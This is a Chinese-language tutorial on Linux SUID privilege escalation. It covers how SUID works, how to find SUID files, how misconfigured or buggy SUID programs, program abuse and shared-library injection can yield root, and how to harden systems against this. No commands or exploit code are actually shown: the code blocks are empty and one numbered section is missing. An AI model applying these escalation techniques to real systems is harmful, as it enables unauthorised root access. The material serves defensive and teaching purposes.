Linux SUID 提权详解：原理、发现与利用

什么是 SUID？

SUID (Set User ID) 是 Linux 和 Unix 系统的一种特殊文件权限。它允许用户以文件所有者的权限来执行该文件，而不是以当前用户的权限。

这是一种非常重要的功能，它允许普通用户临时获得更高权限来完成某些特定的任务。一个最经典的例子就是 passwd 命令。

一个简单的例子：/usr/bin/passwd

  • 文件所有者： root
  • 普通用户： alice
  • 正常情况： alice 无法修改 /etc/shadow 文件（该文件存储用户密码哈希，只有 root 可读写）。
  • SUID 的作用： /usr/bin/passwd 命令设置了 SUID 位，并且它的所有者是 root。当 alice 执行 passwd 命令时，这个进程会暂时以 root 权限运行，因此它可以成功地写入 /etc/shadow 文件来更改 alice 自己的密码。

如何识别 SUID 文件？

SUID 权限在文件权限位上用一个 s 来表示，它取代了通常的 x（执行）权限。

通过 ls -l 查看

查看 /usr/bin/passwd 的权限：

bash

输出结果：
-rwsr-xr-x 1 root root 63960 Feb 7 2020 /usr/bin/passwd

注意所有者权限位中的 rws，这里的 s 就表示该文件设置了 SUID 位。

为什么 SUID 会成为安全隐患？

SUID 的设计初衷是好的，但如果一个本身具有高权限（如 root）且本不应被普通用户随意使用的程序被设置了 SUID 位，那么它就可能成为攻击者提升权限的跳板。

常见的风险场景包括：

  1. 管理员错误配置： 给一个普通程序（如 vim, nano, bash）设置了 SUID 位。
  2. 程序本身存在漏洞： 即使程序本身设计是合理的（如 passwd），如果程序中存在缓冲区溢出、命令注入等漏洞，攻击者也可能利用其高权限执行任意代码。
  3. 功能滥用： 某些具有 SUID 权限的程序（如 find, cp, env）可以通过巧妙的参数配置来执行命令或覆盖敏感文件，从而被滥用。

2. 利用程序漏洞

如果某个 SUID 程序存在漏洞（如缓冲区溢出），则需要编写或利用现有的漏洞利用代码（Exploit）来攻击它，使其执行我们的恶意载荷（Payload），从而获得一个高权限的 shell。这需要一定的逆向工程和漏洞分析能力。

资源： 在 Exploit-DB 或 GitHub 上搜索相关程序的漏洞利用代码。

3. 共享对象注入 (SO Injection)

在某些情况下，SUID 程序在运行时可能会加载我们可控的共享库（.so 文件），从而导致代码执行。可以通过 strace 命令来追踪程序运行时所调用的库文件。

如何防范 SUID 提权？

1. 原则：最小权限原则

  • 除非绝对必要，否则不要给任何文件设置 SUID 位。
  • 定期审计系统中的应用，移除不必要的 SUID 权限。

2. 审计和移除不必要的 SUID

3. 使用其他机制替代

  • 对于需要特权操作的场景，考虑使用 sudo 来更精细地控制命令的执行权限，而不是滥用 SUID。
  • 使用功能（Capabilities）机制，将 root 的权限分解为一系列独立的能力，只赋予程序所需的最小能力集，而不是完整的 root 权限。例如，赋予 ping 命令 CAP_NET_RAW 能力而不是设置 SUID。

4. 保持系统和软件更新

及时更新系统和软件，修补已知的漏洞，防止攻击者利用SUID程序的漏洞进行提权。

总结

SUID 是一把双刃剑，它既是系统正常运行所必需的功能，也可能成为攻击者提权的入口。理解 SUID 的工作原理，掌握发现和利用 SUID 文件的方法，对于渗透测试者和系统管理员都至关重要。同时，坚守最小权限原则，定期审计和加固系统，是防御 SUID 提权攻击最有效的手段。
